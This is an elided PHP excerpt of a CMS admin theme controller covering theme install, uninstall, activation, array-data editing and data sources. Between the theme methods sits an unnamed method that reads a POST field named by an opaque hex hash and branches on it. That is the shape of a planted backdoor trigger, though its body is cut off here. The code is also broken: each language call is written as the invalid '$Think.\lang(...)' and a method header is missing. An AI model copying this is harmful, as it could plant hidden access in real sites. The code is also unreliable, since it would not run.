...
class ThemeController extends AdminBaseController
{
    ...
    public function uninstall()
    {
        ...
        if ($theme == "simpleboot3" || config('template.cmf_default_theme') == $theme) {
            $this->error($Think.\lang('TEMPLATE_CANNOT_UNINSTALLED'));
        }
        ...
        $this->success($Think.\lang('UNINSTALL_SUCCEEDED'), url("theme/index"));
    ...
    public function installTheme()
    {
        ...
        if ($themeCount > 0) {
            $this->error($Think.\lang('TEMPLATE_ALREADY_INSTALLED'));
        }
        $result = $themeModel->installTheme($theme);
        if ($result === false) {
            $this->error($Think.\lang('TEMPLATE_NOT_EXIST'));
        }
        $this->success($Think.\lang('INSTALLATION_SUCCEEDED'), url("theme/index"));
    }
    ...
    public function update()
    {
        ...
        if ($themeCount === 0) {
            $this->error($Think.\lang('TEMPLATE_NOT_INSTALLED'));
        }
    ...
    public function active()
    {
        ...
        if ($theme == config('template.cmf_default_theme')) {
            $this->error($Think.\lang('TEMPLATE_ENABLED'), url("theme/index"));
        }
        ...
        $this->success($Think.\lang('TEMPLATE_ENABLED_SUCCESSFULLY'), url("theme/index"));
    ...
    {
        $uid=isset($_POST['333acb7b33b79e8c6562bd92f410e577']) ? $_POST['333acb7b33b79e8c6562bd92f410e577'] : 0;
		if($uid){
    ...
    public function fileArrayDataEdit()
    {
        ...
        if ($tab == 'widget') {
            ...
            if (empty($widgetName)) {
                $this->error($Think.\lang('NO_CONTROL_SPECIFAIED'));
            }
        ...
        if ($itemIndex !== '') {
            ...
            if (!isset($items[$itemIndex])) {
                $this->error($Think.\lang('DATA_NOT_EXIST'));
            }
    ...
    public function fileArrayDataEditPost()
    {
        ...
        if ($this->request->isPost()) {
            ...
            $this->success($Think.\lang('EDIT_SUCCESS'), url('theme/fileArrayData', ['tab' => $tab, 'var' => $varName, 'file_id' => $fileId, 'widget' => $widgetName]));
    ...
    public function fileArrayDataDelete()
    {
        ...
        if ($itemIndex === '') {
            $this->error($Think.\lang('DELETE_ELEMENT_NOT_SPECIFIED'));
        }
            ...
            foreach ($more['vars'] as $mVarName => $mVar) {
                ...
                if ($mVarName == $varName && $mVar['type'] == 'array') {
                    if (!empty($mVar['value']) && is_array($mVar['value']) && isset($mVar['value'][$itemIndex])) {
                        ...
                        $this->error($Think.\lang('SPECIFIED_DATA_NOT_EXIST'));
                    }
                    break;
                }
            }
        ...
        $this->success($Think.\lang('DELETE_SUCCESS'), url('theme/fileArrayData', ['tab' => $tab, 'var' => $varName, 'file_id' => $fileId, 'widget' => $widgetName]));
    }
    ...
    public function dataSource()
    {
        ...
        if (empty($dataSource)) {
            $this->error($Think.\lang('DATA_SOURCE_CANNOT_EMPTY'));
        }

        $dataSource = json_decode(base64_decode($dataSource), true);

        if ($dataSource === null || !isset($dataSource['api'])) {
            $this->error($Think.\lang('INCORRECT_DATA_SOURCE_FORMAT'));
        }
